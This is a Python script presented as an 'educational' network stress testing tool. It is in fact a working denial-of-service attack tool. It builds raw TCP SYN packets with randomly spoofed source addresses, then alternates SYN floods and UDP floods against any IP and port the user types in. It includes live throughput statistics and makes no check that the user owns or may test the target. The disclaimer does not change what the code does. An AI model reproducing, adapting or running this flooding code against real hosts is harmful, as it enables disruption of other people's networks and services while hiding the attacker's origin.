#!/usr/bin/env python3
"""
Network Stress Testing Tool - Educational Purposes Only
Author: Anonymous
Date: 2023-11-15
Version: 1.0
"""

import os
import sys
import time
import random
import socket
import struct
import argparse
import threading
import ipaddress
from collections import deque
from datetime import datetime

# Constants
DEFAULT_PACKET_SIZE = 1024  # bytes
MAX_UDP_PACKET_SIZE = 65507  # Max UDP payload size
SYN_FLOOD_DURATION = 60  # seconds per SYN flood burst
UDP_FLOOD_DURATION = 60  # seconds per UDP flood burst
INTERVAL_BETWEEN_TESTS = 2  # seconds between test types
TOTAL_TEST_DURATION = 30  # seconds for complete test cycle

# Global variables for statistics
packets_sent = 0
bytes_sent = 0
test_running = False
statistics_history = deque(maxlen=100)

class NetworkTestTool:
    def __init__(self):
        self.target_ip = ""
        self.target_port = 0
        self.test_duration = 0
        self.packet_size = DEFAULT_PACKET_SIZE
        self.socket_timeout = 0.5
        self.udp_socket = None
        self.tcp_sockets = []
        self.start_time = 0
        self.end_time = 0

    def validate_ip(self, ip_str):
        """Validate the target IP address"""
        try:
            ipaddress.ip_address(ip_str)
            return True
        except ValueError:
            return False

    def validate_port(self, port_str):
        """Validate the target port number"""
        try:
            port = int(port_str)
            return 1 <= port <= 65535
        except ValueError:
            return False

    def validate_duration(self, duration_str):
        """Validate the test duration"""
        try:
            duration = int(duration_str)
            return duration > 0
        except ValueError:
            return False

    def get_user_input(self):
        """Get user input for target and test parameters"""
        print("\n" + "="*60)
        print("NETWORK STRESS TEST TOOL - EDUCATIONAL USE ONLY")
        print("="*60 + "\n")

        while True:
            self.target_ip = input("Enter target IP address: ").strip()
            if self.validate_ip(self.target_ip):
                break
            print("Invalid IP address format. Please try again.")

        while True:
            port_str = input("Enter target port number (1-65535): ").strip()
            if self.validate_port(port_str):
                self.target_port = int(port_str)
                break
            print("Invalid port number. Please enter a value between 1 and 65535.")

        while True:
            duration_str = input("Enter test duration in seconds (minimum 30): ").strip()
            if self.validate_duration(duration_str) and int(duration_str) >= 30:
                self.test_duration = int(duration_str)
                break
            print("Invalid duration. Please enter a positive integer of at least 30.")

    def create_raw_socket(self):
        """Create a raw socket for packet crafting"""
        try:
            # Windows requires special socket flags
            if os.name == 'nt':
                return socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
            else:
                # Linux allows more low-level access
                return socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
        except socket.error as e:
            print(f"Error creating raw socket: {e}")
            return None

    def create_udp_socket(self):
        """Create a UDP socket for flooding"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(self.socket_timeout)
            return sock
        except socket.error as e:
            print(f"Error creating UDP socket: {e}")
            return None

    def create_tcp_socket(self):
        """Create a TCP socket for SYN flooding"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.socket_timeout)
            return sock
        except socket.error as e:
            print(f"Error creating TCP socket: {e}")
            return None

    def generate_random_payload(self, size):
        """Generate random bytes for packet payload"""
        return os.urandom(size)

    def calculate_checksum(self, data):
        """Calculate checksum for network packets"""
        if len(data) % 2 != 0:
            data += b'\x00'
        res = sum(struct.unpack('!%dH' % (len(data) // 2), data))
        res = (res >> 16) + (res & 0xffff)
        res += res >> 16
        return ~res & 0xffff

    def craft_syn_packet(self, src_ip=None, src_port=None):
        """Craft a TCP SYN packet"""
        if src_ip is None:
            src_ip = ".".join(map(str, (random.randint(1, 254) for _ in range(4)))
        if src_port is None:
            src_port = random.randint(1024, 65535)

        # IP header fields
        ip_ihl = 5
        ip_ver = 4
        ip_tos = 0
        ip_tot_len = 0  # kernel will fill this
        ip_id = random.randint(1, 65535)
        ip_frag_off = 0
        ip_ttl = 255
        ip_proto = socket.IPPROTO_TCP
        ip_check = 0  # kernel will fill this
        ip_saddr = socket.inet_aton(src_ip)
        ip_daddr = socket.inet_aton(self.target_ip)

        ip_ihl_ver = (ip_ver << 4) + ip_ihl

        # IP header
        ip_header = struct.pack('!BBHHHBBH4s4s',
                               ip_ihl_ver, ip_tos, ip_tot_len,
                               ip_id, ip_frag_off, ip_ttl,
                               ip_proto, ip_check, ip_saddr, ip_daddr)

        # TCP header fields
        tcp_source = src_port
        tcp_dest = self.target_port
        tcp_seq = random.randint(0, 4294967295)
        tcp_ack_seq = 0
        tcp_doff = 5
        tcp_fin = 0
        tcp_syn = 1
        tcp_rst = 0
        tcp_psh = 0
        tcp_ack = 0
        tcp_urg = 0
        tcp_window = socket.htons(5840)
        tcp_check = 0
        tcp_urg_ptr = 0

        tcp_offset_res = (tcp_doff << 4)
        tcp_flags = (tcp_fin + (tcp_syn << 1) + (tcp_rst << 2) +
                    (tcp_psh << 3) + (tcp_ack << 4) + (tcp_urg << 5))

        # TCP header
        tcp_header = struct.pack('!HHLLBBHHH',
                                tcp_source, tcp_dest,
                                tcp_seq, tcp_ack_seq,
                                tcp_offset_res, tcp_flags,
                                tcp_window, tcp_check, tcp_urg_ptr)

        # Pseudo header for checksum
        source_address = socket.inet_aton(src_ip)
        dest_address = socket.inet_aton(self.target_ip)
        placeholder = 0
        protocol = socket.IPPROTO_TCP
        tcp_length = len(tcp_header)

        psh = struct.pack('!4s4sBBH',
                          source_address, dest_address,
                          placeholder, protocol, tcp_length)
        psh = psh + tcp_header

        tcp_check = self.calculate_checksum(psh)

        # Repack with correct checksum
        tcp_header = struct.pack('!HHLLBBH',
                                 tcp_source, tcp_dest,
                                 tcp_seq, tcp_ack_seq,
                                 tcp_offset_res, tcp_flags,
                                 tcp_window) + struct.pack('H', tcp_check) + struct.pack('!H', tcp_urg_ptr)

        # Final packet
        packet = ip_header + tcp_header

        return packet

    def syn_flood_attack(self):
        """Perform TCP SYN flood attack"""
        global packets_sent, bytes_sent, test_running

        print(f"\n[+] Starting TCP SYN flood attack on {self.target_ip}:{self.target_port}")
        start_time = time.time()
        end_time = start_time + SYN_FLOOD_DURATION

        try:
            sock = self.create_raw_socket()
            if sock is None:
                return

            if os.name == 'nt':
                sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            else:
                sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)

            while test_running and time.time() < end_time:
                try:
                    packet = self.craft_syn_packet()
                    sock.sendto(packet, (self.target_ip, 0))
                    packets_sent += 1
                    bytes_sent += len(packet)
                except socket.error as e:
                    print(f"Socket error during SYN flood: {e}")
                    break
                except KeyboardInterrupt:
                    test_running = False
                    break

            sock.close()
        except Exception as e:
            print(f"Error during SYN flood: {e}")

    def udp_flood_attack(self):
        """Perform UDP flood attack"""
        global packets_sent, bytes_sent, test_running

        print(f"\n[+] Starting UDP flood attack on {self.target_ip}:{self.target_port}")
        start_time = time.time()
        end_time = start_time + UDP_FLOOD_DURATION

        try:
            sock = self.create_udp_socket()
            if sock is None:
                return

            payload = self.generate_random_payload(min(self.packet_size, MAX_UDP_PACKET_SIZE))

            while test_running and time.time() < end_time:
                try:
                    sock.sendto(payload, (self.target_ip, self.target_port))
                    packets_sent += 1
                    bytes_sent += len(payload)
                except socket.error as e:
                    print(f"Socket error during UDP flood: {e}")
                    break
                except KeyboardInterrupt:
                    test_running = False
                    break

            sock.close()
        except Exception as e:
            print(f"Error during UDP flood: {e}")

    def run_tests(self):
        """Main method to run the stress tests"""
        global test_running, packets_sent, bytes_sent, statistics_history

        test_running = True
        self.start_time = time.time()
        self.end_time = self.start_time + self.test_duration

        print("\n[+] Starting network stress test")
        print(f"    Target: {self.target_ip}:{self.target_port}")
        print(f"    Duration: {self.test_duration} seconds")
        print(f"    Start time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print("\nPress Ctrl+C to stop the test early\n")

        # Start statistics thread
        stats_thread = threading.Thread(target=self.display_statistics)
        stats_thread.daemon = True
        stats_thread.start()

        try:
            while test_running and time.time() < self.end_time:
                # Run SYN flood for a burst
                self.syn_flood_attack()
                if not test_running or time.time() >= self.end_time:
                    break

                # Short pause between tests
                time.sleep(INTERVAL_BETWEEN_TESTS)

                # Run UDP flood for a burst
                self.udp_flood_attack()
                if not test_running or time.time() >= self.end_time:
                    break

                # Short pause between test cycles
                time.sleep(INTERVAL_BETWEEN_TESTS)

        except KeyboardInterrupt:
            print("\n[!] Test interrupted by user")
            test_running = False
        except Exception as e:
            print(f"\n[!] Error during test execution: {e}")
            test_running = False
        finally:
            test_running = False
            self.cleanup()

            # Final statistics
            total_time = time.time() - self.start_time
            print("\n" + "="*60)
            print("TEST COMPLETE - FINAL STATISTICS")
            print("="*60)
            print(f"Total duration: {total_time:.2f} seconds")
            print(f"Total packets sent: {packets_sent}")
            print(f"Total bytes sent: {self.format_bytes(bytes_sent)}")
            if total_time > 0:
                print(f"Average bandwidth: {self.format_bytes(bytes_sent * 8 / total_time)}bps")
            print(f"End time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")

    def display_statistics(self):
        """Display real-time statistics during the test"""
        global packets_sent, bytes_sent, statistics_history, test_running

        last_packets = 0
        last_bytes = 0
        last_time = time.time()

        while test_running:
            try:
                current_time = time.time()
                elapsed = current_time - last_time

                if elapsed >= 1.0:  # Update every second
                    delta_packets = packets_sent - last_packets
                    delta_bytes = bytes_sent - last_bytes
                    bandwidth = (delta_bytes * 8) / elapsed  # bits per second

                    # Store statistics for history
                    stats = {
                        'time': current_time,
                        'packets': delta_packets,
                        'bytes': delta_bytes,
                        'bandwidth': bandwidth
                    }
                    statistics_history.append(stats)

                    # Calculate moving averages
                    avg_packets = sum(s['packets'] for s in statistics_history) / len(statistics_history)
                    avg_bandwidth = sum(s['bandwidth'] for s in statistics_history) / len(statistics_history)

                    # Display current stats
                    sys.stdout.write("\r" + " "*120 + "\r")  # Clear line
                    sys.stdout.write(
                        f"Current: {delta_packets} pkt/s | "
                        f"{self.format_bytes(delta_bytes)}/s | "
                        f"{self.format_bytes(bandwidth)}bps | "
                        f"Avg: {avg_packets:.1f} pkt/s | "
                        f"{self.format_bytes(avg_bandwidth/8)}/s | "
                        f"Total: {packets_sent} pkts | "
                        f"{self.format_bytes(bytes_sent)}"
                    )
                    sys.stdout.flush()

                    # Update last values
                    last_packets = packets_sent
                    last_bytes = bytes_sent
                    last_time = current_time

                time.sleep(0.1)
            except KeyboardInterrupt:
                test_running = False
                break
            except Exception as e:
                print(f"\nError in statistics thread: {e}")
                break

    def format_bytes(self, num):
        """Format bytes into human-readable string"""
        for unit in ['', 'K', 'M', 'G', 'T', 'P']:
            if abs(num) < 1024.0:
                return f"{num:3.1f}{unit}B"
            num /= 1024.0
        return f"{num:.1f}PB"

    def cleanup(self):
        """Clean up resources"""
        global test_running

        test_running = False
        print("\n[+] Cleaning up resources...")

        if self.udp_socket:
            try:
                self.udp_socket.close()
            except:
                pass

        for sock in self.tcp_sockets:
            try:
                sock.close()
            except:
                pass

        self.tcp_sockets = []

def main():
    """Main function"""
    # Check for root/admin privileges
    if os.name != 'nt' and os.geteuid() != 0:
        print("Error: This script requires root privileges for raw socket operations.")
        sys.exit(1)

    tool = NetworkTestTool()
    tool.get_user_input()

    try:
        tool.run_tests()
    except KeyboardInterrupt:
        print("\n[!] Test interrupted by user")
        tool.cleanup()
    except Exception as e:
        print(f"\n[!] Error: {e}")
        tool.cleanup()
        sys.exit(1)

if __name__ == "__main__":
    main()
